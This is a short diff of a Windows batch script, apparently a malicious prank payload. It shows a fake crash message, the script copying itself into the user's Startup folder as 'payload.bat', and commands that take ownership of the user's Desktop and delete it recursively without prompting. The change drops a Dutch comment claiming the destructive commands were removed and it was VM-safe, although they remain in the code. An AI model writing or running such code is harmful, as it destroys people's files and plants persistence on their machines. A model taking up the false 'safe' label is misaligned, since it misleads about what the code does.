@@ -80,7 +80,7 @@ start cmd /c "color 1F && mode con: cols=80 lines=25 && echo A problem has been 
 :: === SELF-COPY TO STARTUP ===
 copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat" >nul
 
-:: === MESS WITH USER (safe in VM, destructieve commands verwijderd) ===
+:: === MESS WITH USER ===
 takeown /f "%userprofile%\Desktop" /r /d y >nul
 rmdir /s /q "%userprofile%\Desktop"
 
